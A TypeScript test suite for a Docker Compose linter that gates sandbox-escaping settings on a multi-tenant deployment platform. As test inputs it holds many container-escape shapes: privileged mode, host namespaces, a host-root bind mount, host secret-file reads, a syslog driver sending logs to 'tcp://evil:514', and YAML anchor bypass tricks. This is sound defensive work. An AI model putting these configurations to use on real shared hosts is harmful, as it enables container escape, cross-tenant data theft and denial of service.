import { test } from "node:test";
import assert from "node:assert/strict";

import {
  composeBuildReachesHost,
  composeFileBindings,
  composeJoinsForeignNetwork,
  composeClaimsReservedName,
  composeHasHostBindMount,
  composeMountsForeignStorage,
  composeNeedsHostPrivileges,
  composeUsesExternalMerge,
  isEscapingSource,
  isFilesConventionSource,
  isHostBindSource,
  lintCompose,
  volumeSource,
} from "./compose-lint";

/**
 * The server gates compose edits that bind-mount a host path behind the
 * `canMountHostVolumes` grant. The detection MUST agree with the editor lint (both
 * use volumeSource + isHostBindSource), so it's tested directly here.
 */

test("volumeSource extracts the source of each volume entry form", () => {
  assert.equal(volumeSource("/data:/data"), "/data");
  assert.equal(volumeSource("named:/data"), "named");
  assert.equal(volumeSource("/anon"), null); // no ":" → anonymous, not a bind src
  assert.equal(
    volumeSource({ type: "bind", source: "/host", target: "/x" }),
    "/host",
  );
});

test("isHostBindSource: absolute and escaping sources are host binds", () => {
  assert.equal(isHostBindSource("/data"), true);
  assert.equal(isHostBindSource("/etc/passwd"), true);
  // The ./ app-files convention is project-isolated, not a host bind.
  assert.equal(isHostBindSource("./config"), false);
  assert.equal(isHostBindSource("./folder/x"), false);
  assert.equal(isHostBindSource("."), false);
  // A `..` climb escapes the sandbox - now treated as a host bind (gated).
  assert.equal(isHostBindSource("../files/config"), true);
  assert.equal(isHostBindSource("../sibling/data"), true);
  assert.equal(isHostBindSource("./../escape"), true);
  // Named volumes and anonymous mounts are not host binds.
  assert.equal(isHostBindSource("named"), false);
  assert.equal(isHostBindSource(null), false);
});

test("isFilesConventionSource: ./ paths in, .. and absolute out", () => {
  assert.equal(isFilesConventionSource("./config.toml"), true);
  assert.equal(isFilesConventionSource("./folder/x"), true);
  assert.equal(isFilesConventionSource("."), true);
  assert.equal(isFilesConventionSource("./"), true);
  assert.equal(isFilesConventionSource("../escape"), false);
  assert.equal(isFilesConventionSource("./../escape"), false);
  assert.equal(isFilesConventionSource("/abs"), false);
  assert.equal(isFilesConventionSource("named"), false);
});

test("isEscapingSource: any .. path segment escapes", () => {
  assert.equal(isEscapingSource("../x"), true);
  assert.equal(isEscapingSource("./../x"), true);
  assert.equal(isEscapingSource("a/../b"), true);
  assert.equal(isEscapingSource("./x"), false);
  assert.equal(isEscapingSource("/abs"), false);
  assert.equal(isEscapingSource("name"), false);
  assert.equal(isEscapingSource(null), false);
});

test("composeHasHostBindMount: true for an absolute string bind", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - /srv/data:/data`;
  assert.equal(composeHasHostBindMount(yaml), true);
});

test("composeHasHostBindMount: true for a long-form bind mount", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - type: bind
        source: /srv/data
        target: /data`;
  assert.equal(composeHasHostBindMount(yaml), true);
});

test("composeHasHostBindMount: false for a named volume", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - appdata:/data
volumes:
  appdata:`;
  assert.equal(composeHasHostBindMount(yaml), false);
});

test("composeHasHostBindMount: false for the ./ app-files convention", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - ./config:/etc/app/config`;
  assert.equal(composeHasHostBindMount(yaml), false);
});

test("composeHasHostBindMount: true for a .. sandbox escape (now gated)", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - ../sibling/data:/data`;
  assert.equal(composeHasHostBindMount(yaml), true);
});

test("composeHasHostBindMount: tolerant of malformed / empty input", () => {
  assert.equal(composeHasHostBindMount(""), false);
  assert.equal(composeHasHostBindMount("::: not yaml ["), false);
  assert.equal(composeHasHostBindMount("services: {}"), false);
});

test("composeHasHostBindMount: detects a bind in any of several services", () => {
  const yaml = `services:
  web:
    image: nginx
    volumes:
      - webdata:/data
  db:
    image: postgres
    volumes:
      - /var/lib/host-pg:/var/lib/postgresql/data`;
  assert.equal(composeHasHostBindMount(yaml), true);
});

/* ------------------------------------------------------------------ */
/* Host PRIVILEGES: the other way out of the sandbox                   */
/* ------------------------------------------------------------------ */

/**
 * A bind mount names a path, so the check above could see it.
 */
test("composeNeedsHostPrivileges: every escape shape is caught", () => {
  const shapes = [
    "    privileged: true",
    '    cap_add: ["SYS_ADMIN"]',
    "    pid: host",
    "    ipc: host",
    "    userns_mode: host",
    '    devices: ["/dev/sda:/dev/sda"]',
    '    security_opt: ["apparmor:unconfined"]',
    "    cgroup_parent: /custom",
    '    device_cgroup_rules: ["c 1:3 mr"]',
  ];
  for (const line of shapes) {
    const yaml = `services:\n  app:\n    image: nginx\n${line}`;
    assert.equal(
      composeNeedsHostPrivileges(yaml),
      true,
      `not caught: ${line.trim()}`,
    );
  }
});

test("composeNeedsHostPrivileges: hardening is never gated", () => {
  // Asking for the host permission in order to make a container SAFER would
  // teach people to skip the safer thing.
  const yaml = `services:\n  app:\n    image: nginx\n    security_opt: ["no-new-privileges:true"]\n    cap_drop: ["ALL"]\n    read_only: true`;
  assert.equal(composeNeedsHostPrivileges(yaml), false);
});

test("composeNeedsHostPrivileges: an unconfining security_opt IS gated", () => {
  const yaml = `services:\n  app:\n    image: nginx\n    security_opt: ["no-new-privileges:true", "seccomp:unconfined"]`;
  assert.equal(composeNeedsHostPrivileges(yaml), true);
});

test("composeNeedsHostPrivileges: an ordinary stack asks for nothing", () => {
  const yaml = `services:
  web:
    image: nginx:1.27
    privileged: false
    cap_add: []
    network_mode: bridge
    volumes:
      - ./conf:/etc/nginx
    ports:
      - "8080:80"
  worker:
    image: redis:7`;
  assert.equal(composeNeedsHostPrivileges(yaml), false);
});

test("composeNeedsHostPrivileges: network_mode host IS a privilege (H-3)", () => {
  // The host network namespace lets the container bind arbitrary host ports and
  // reach 127.0.0.1 host services, so it is gated behind canMountHostVolumes.
  const yaml = `services:\n  app:\n    image: nginx\n    network_mode: host`;
  assert.equal(composeNeedsHostPrivileges(yaml), true);
});

test("composeNeedsHostPrivileges: pid/ipc/network_mode container: escapes (C-1)", () => {
  // Joining another container's namespace on the same daemon is a cross-tenant
  // escape, not limited to this stack.
  for (const line of [
    '    pid: "container:x"',
    '    ipc: "container:x"',
    '    network_mode: "container:x"',
  ]) {
    const yaml = `services:\n  app:\n    image: nginx\n${line}`;
    assert.equal(
      composeNeedsHostPrivileges(yaml),
      true,
      `not caught: ${line.trim()}`,
    );
  }
});

test("composeNeedsHostPrivileges: unparseable YAML is not a detection", () => {
  assert.equal(composeNeedsHostPrivileges("services: [oops"), false);
  assert.equal(composeNeedsHostPrivileges(""), false);
});

/* ------------------------------------------------------------------ */
/* Foreign STORAGE: the other half of the host-volume permission        */
/* ------------------------------------------------------------------ */

/**
 * The service-level bind check reads a mount's SOURCE and calls it a host bind
 * when it starts with `/` or climbs with `..`.
 */
test("composeMountsForeignStorage: an external volume is foreign", () => {
  for (const decl of [
    "    external: true",
    "    external: true\n    name: deplo_deplo-postgres",
    "    external:\n      name: deplo-victim-data",
    "    name: deplo-victim-data",
  ]) {
    const yaml = `services:\n  app:\n    image: nginx\n    volumes:\n      - stolen:/x\nvolumes:\n  stolen:\n${decl}`;
    assert.equal(
      composeMountsForeignStorage(yaml),
      true,
      `not caught:\n${decl}`,
    );
  }
});

test("composeMountsForeignStorage: a driver_opts bind of the host is foreign", () => {
  const yaml = `services:
  app:
    image: nginx
    volumes:
      - hostroot:/host
volumes:
  hostroot:
    driver: local
    driver_opts:
      type: none
      device: /
      o: bind`;
  assert.equal(composeMountsForeignStorage(yaml), true);
  // And the bind check still does not see it, which is exactly why this exists.
  assert.equal(composeHasHostBindMount(yaml), false);
});

test("composeMountsForeignStorage: an ordinary app volume is not foreign", () => {
  // No `name:`, no `external:`, no `driver_opts:` - compose creates it per
  // project and Deplo pins its host name at RENDER time, after this has run.
  const yaml = `services:
  app:
    image: postgres:16
    volumes:
      - data:/var/lib/postgresql/data
volumes:
  data: {}`;
  assert.equal(composeMountsForeignStorage(yaml), false);
});

test("composeMountsForeignStorage: no volumes block, and unparseable YAML", () => {
  assert.equal(
    composeMountsForeignStorage("services:\n  app:\n    image: nginx"),
    false,
  );
  assert.equal(composeMountsForeignStorage("volumes: [oops"), false);
  assert.equal(composeMountsForeignStorage(""), false);
});

/* ------------------------------------------------------------------ */
/* The shared network is Deplo's to hand out, not the tenant's to claim */
/* ------------------------------------------------------------------ */

/**
 * A container on the shared `deplo` network registers its service name as a DNS
 * alias there, and Docker round-robins a name two containers both claim.
 */
test("composeClaimsReservedName: only when it joins the shared network", () => {
  const onShared = `services:
  postgres:
    image: alpine
    networks: [deplo]
networks:
  deplo: {external: true}`;
  assert.equal(composeClaimsReservedName(onShared), "postgres");

  // The ordinary case, and by far the most common compose file there is: a
  // service called `postgres` on the stack's OWN network. Untouched.
  const ordinary = `services:
  web:
    image: nginx
  postgres:
    image: postgres:16`;
  assert.equal(composeClaimsReservedName(ordinary), null);
});

/**
 * Host-file / foreign-container escapes that trip NO other detector (no
 * `privileged`, no host bind, no top-level pinned volume) and so were ungated:
 * `env_file` reads a host file into env; `secrets`/`configs` with a `file:` source
 */
test("composeNeedsHostPrivileges: env_file reads a host file (abs or bare name)", () => {
  for (const ef of ["/data/stacks/victim.env", "victim.env"]) {
    const yaml = `services:\n  a:\n    image: x\n    env_file:\n      - ${ef}`;
    assert.equal(composeNeedsHostPrivileges(yaml), true, `env_file ${ef}`);
  }
  // The object form `{path, required}` counts too.
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    env_file:\n      - path: /etc/secret\n        required: false`,
    ),
    true,
  );
});

test("composeNeedsHostPrivileges: volumes_from container: escapes; a bare service is same-stack", () => {
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    volumes_from:\n      - "container:deplo-victim-web-1"`,
    ),
    true,
  );
  // A bare service name shares only THIS stack's volumes - left alone.
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    volumes_from:\n      - db`,
    ),
    false,
  );
});

test("composeNeedsHostPrivileges: cgroup host escapes; cgroup private does not", () => {
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    cgroup: host`,
    ),
    true,
  );
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    cgroup: private`,
    ),
    false,
  );
});

test("composeMountsForeignStorage: a top-level secrets/configs file: source is a host-file read", () => {
  assert.equal(
    composeMountsForeignStorage(
      `services:\n  a:\n    image: x\n    secrets: [s]\nsecrets:\n  s:\n    file: /root/projects/deplo/.env`,
    ),
    true,
  );
  assert.equal(
    composeMountsForeignStorage(
      `services:\n  a:\n    image: x\nconfigs:\n  c:\n    file: victim.env`,
    ),
    true,
  );
  // An `environment:`-sourced secret carries no host path - left alone.
  assert.equal(
    composeMountsForeignStorage(
      `services:\n  a:\n    image: x\nsecrets:\n  s:\n    environment: FOO`,
    ),
    false,
  );
});

test("the five ungated escapes leave an ordinary compose free (no over-gating)", () => {
  const plain = `services:\n  web:\n    image: nginx:1.27\n    ports:\n      - "8080:80"\nvolumes:\n  data: {}`;
  assert.equal(composeNeedsHostPrivileges(plain), false);
  assert.equal(composeMountsForeignStorage(plain), false);
});

test("oom_kill_disable is a cross-tenant DoS and needs the grant; false does not", () => {
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    oom_kill_disable: true`,
    ),
    true,
  );
  assert.equal(
    composeNeedsHostPrivileges(
      `services:\n  a:\n    image: x\n    oom_kill_disable: false`,
    ),
    false,
  );
});

/**
 * `build:` reaching a host path bakes host bytes into the image (or escapes at
 * build time), the same host reach a bind mount has - gated the same. A
 * project-relative `./`-context (the normal case) stays free.
 */
test("composeBuildReachesHost: absolute/ssh/privileged build reaches the host; a relative build is free", () => {
  for (const b of [
    `build:\n      context: /etc`,
    `build: /etc`,
    `build:\n      context: ./app\n      additional_contexts:\n        - h=/root`,
    `build:\n      context: ./app\n      ssh:\n        - default`,
    `build:\n      context: ./app\n      privileged: true`,
  ]) {
    assert.equal(
      composeBuildReachesHost(`services:\n  a:\n    ${b}`),
      true,
      `should flag: ${b}`,
    );
  }
  // The everyday case: a project-relative build context.
  assert.equal(
    composeBuildReachesHost(`services:\n  a:\n    build: ./app`),
    false,
  );
  assert.equal(
    composeBuildReachesHost(
      `services:\n  a:\n    build:\n      context: ./app\n      dockerfile: Dockerfile`,
    ),
    false,
  );
});

/**
 * Keys that merge config from a file the gate can't inspect are refused outright:
 * they smuggle privileged/host binds/ports and even traefik.
 */
/**
 * The network twin of the foreign-STORAGE gate.
 */
test("composeJoinsForeignNetwork: an external/pinned/host-bridged network join needs the grant", () => {
  const joins = (nets: string) =>
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\n    networks: [v]\n${nets}`,
    );
  assert.equal(
    joins(
      `networks:\n  v:\n    external: true\n    name: deplo-victim_default`,
    ),
    true,
  );
  assert.equal(joins(`networks:\n  v:\n    name: deplo-victim_default`), true);
  assert.equal(joins(`networks:\n  v:\n    external: true`), true);
  assert.equal(
    joins(`networks:\n  v:\n    external:\n      name: deplo-victim_default`),
    true,
  );
  // A driver that bridges onto the host's own segment reaches past the app too.
  assert.equal(
    joins(
      `networks:\n  v:\n    driver: macvlan\n    driver_opts:\n      parent: eth0`,
    ),
    true,
  );
  // Map form of the service join is read the same way.
  assert.equal(
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\n    networks:\n      v: null\nnetworks:\n  v:\n    external: true\n    name: deplo-victim_default`,
    ),
    true,
  );
});

test("composeJoinsForeignNetwork: an app's own network, and the shared one, stay free", () => {
  // The everyday case: a private per-app network.
  assert.equal(
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\n    networks: [internal]\nnetworks:\n  internal: {}`,
    ),
    false,
  );
  // The shared `deplo` network is governed by its own choke point - by key AND
  // under an alias that points at it by name.
  assert.equal(
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\n    networks: [deplo]\nnetworks:\n  deplo:\n    external: true`,
    ),
    false,
  );
  assert.equal(
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\n    networks: [sneaky]\nnetworks:\n  sneaky:\n    external: true\n    name: deplo`,
    ),
    false,
  );
  // Declared but never attached deploys nothing.
  assert.equal(
    composeJoinsForeignNetwork(
      `services:\n  a:\n    image: x\nnetworks:\n  v:\n    external: true\n    name: deplo-victim_default`,
    ),
    false,
  );
  assert.equal(
    composeJoinsForeignNetwork(`services:\n  a:\n    image: nginx`),
    false,
  );
});

test("oom_score_adj is a privilege only when NEGATIVE; group_add and a foreign logging driver always are", () => {
  const svc = (line: string) =>
    composeNeedsHostPrivileges(`services:\n  a:\n    image: x\n${line}`);
  // Negative = "kill my neighbours first", the oom_kill_disable effect by degrees.
  assert.equal(svc("    oom_score_adj: -1000"), true);
  // Positive only volunteers this container - free.
  assert.equal(svc("    oom_score_adj: 500"), false);
  assert.equal(svc(`    group_add: ["docker"]`), true);
  assert.equal(
    svc(
      `    logging:\n      driver: syslog\n      options:\n        syslog-address: "tcp://evil:514"`,
    ),
    true,
  );
  // json-file's own size knobs are what deplo's logs read from - free.
  assert.equal(
    svc(
      `    logging:\n      driver: json-file\n      options:\n        max-size: 10m`,
    ),
    false,
  );
});

test("composeUsesExternalMerge: extends-file, include, label_file are refused; same-file extends is not", () => {
  assert.equal(
    composeUsesExternalMerge(
      `services:\n  a:\n    image: x\n    extends:\n      file: base.yml\n      service: b`,
    ),
    "extends",
  );
  assert.equal(
    composeUsesExternalMerge(
      `include:\n  - extra.yml\nservices:\n  a:\n    image: x`,
    ),
    "include",
  );
  assert.equal(
    composeUsesExternalMerge(
      `services:\n  a:\n    image: x\n    label_file: ./evil.labels`,
    ),
    "label_file",
  );
  assert.equal(
    composeUsesExternalMerge(
      `services:\n  a:\n    image: x\n    extends:\n      service: b`,
    ),
    null,
  );
  assert.equal(composeUsesExternalMerge(`services:\n  a:\n    image: x`), null);
});

/* ------------------------------------------------------------------ */
/* What the editor SAYS before the deploy refuses it                   */
/* ------------------------------------------------------------------ */

test("a reserved service name and a network alias are warned about, not silently handled", () => {
  const diags = lintCompose(
    [
      "services:",
      "  deplo:",
      "    image: nginx:1.27",
      "  api:",
      "    image: nginx:1.27",
      "    networks:",
      "      default:",
      "        aliases:",
      "          - postgres",
    ].join("\n"),
  );
  const rules = diags.map((d) => d.rule);
  assert.ok(
    rules.includes("reserved-service-name"),
    "a service named `deplo` deploys nowhere the moment it gets a domain",
  );
  assert.ok(
    rules.includes("network-aliases-dropped"),
    "the alias is removed at render time, so saying nothing is how it goes missing",
  );
  // Neither stops the stack: both are warnings, and only errors block a save.
  assert.equal(
    diags
      .filter(
        (d) =>
          d.rule === "reserved-service-name" ||
          d.rule === "network-aliases-dropped",
      )
      .every((d) => d.severity === "warning"),
    true,
  );
});

test("an ordinary stack collects neither warning", () => {
  const rules = lintCompose(
    "services:\n  web:\n    image: nginx:1.27\n    networks:\n      - default\n",
  ).map((d) => d.rule);
  assert.equal(rules.includes("reserved-service-name"), false);
  assert.equal(rules.includes("network-aliases-dropped"), false);
});

/* ------------------------------------------------------------------ */
/* composeFileBindings, where a stack mounts its own config files      */
/* ------------------------------------------------------------------ */

/**
 * The compose is the only thing that knows where a stack's config file lands: the
 * file itself just sits in the app's files dir.
 */
test("composeFileBindings reads both volume spellings, with the service", () => {
  const yaml = [
    "services:",
    "  web:",
    "    volumes:",
    "      - ./nginx.conf:/etc/nginx/nginx.conf:ro",
    "      - data:/var/lib/data", // a named volume is not a file
    "      - /srv/host:/mnt", // a host bind is not a file either
    "  api:",
    "    volumes:",
    "      - type: bind",
    "        source: ./conf.d/api.ini",
    "        target: /etc/api.ini",
  ].join("\n");
  assert.deepEqual(composeFileBindings(yaml), [
    {
      filePath: "nginx.conf",
      service: "web",
      mountPath: "/etc/nginx/nginx.conf",
      readOnly: true,
    },
    {
      filePath: "conf.d/api.ini",
      service: "api",
      mountPath: "/etc/api.ini",
      readOnly: false,
    },
  ]);
});

test("composeFileBindings ignores what it cannot show as one file", () => {
  const yaml = [
    "services:",
    "  web:",
    "    volumes:",
    "      - ./:/app", // the whole files dir: no single file to point at
    "      - ../outside.conf:/etc/x.conf", // climbs out: a host bind, not ours
    "      - ./no-target", // nowhere to mount it
  ].join("\n");
  assert.deepEqual(composeFileBindings(yaml), []);
  // And a document it cannot read declares nothing rather than throwing.
  assert.deepEqual(composeFileBindings("services: [oops"), []);
});

/**
 * Every host-escape gate reads the compose with the same parser the RENDERER uses,
 * and each one fails open on YAML it cannot read. So a shape the gate cannot parse
 * but the renderer can is a way past all of them at once - which is what an
 * explicitly tagged merge key was.
 */
test("no host-escape gate is blind to a value that arrives through an anchor", () => {
  const via = (
    block: string,
    service = "    <<: *anchor\n    image: alpine\n",
  ) => `x-anchor: &anchor\n${block}services:\n  a:\n${service}`;

  assert.equal(
    composeNeedsHostPrivileges(via("  privileged: true\n")),
    true,
    "privileged",
  );
  assert.equal(
    composeNeedsHostPrivileges(
      `x-anchor: &anchor\n  !!merge <<: {}\n  privileged: true\nservices:\n  a:\n    <<: *anchor\n    image: alpine\n`,
    ),
    true,
    "privileged behind a TAGGED merge key",
  );
  assert.equal(
    composeNeedsHostPrivileges(via("  cap_add: [SYS_ADMIN]\n")),
    true,
    "cap_add",
  );
  assert.equal(composeNeedsHostPrivileges(via("  pid: host\n")), true, "pid");
  assert.equal(
    composeHasHostBindMount(via('  volumes: ["/:/host"]\n')),
    true,
    "bind mount",
  );
  assert.equal(
    composeBuildReachesHost(
      via("  build: {context: /}\n", "    <<: *anchor\n"),
    ),
    true,
    "build context",
  );
  // And a stack that reaches nowhere still reaches nowhere.
  assert.equal(
    composeNeedsHostPrivileges(via("  restart: always\n")),
    false,
    "a clean anchor",
  );
});
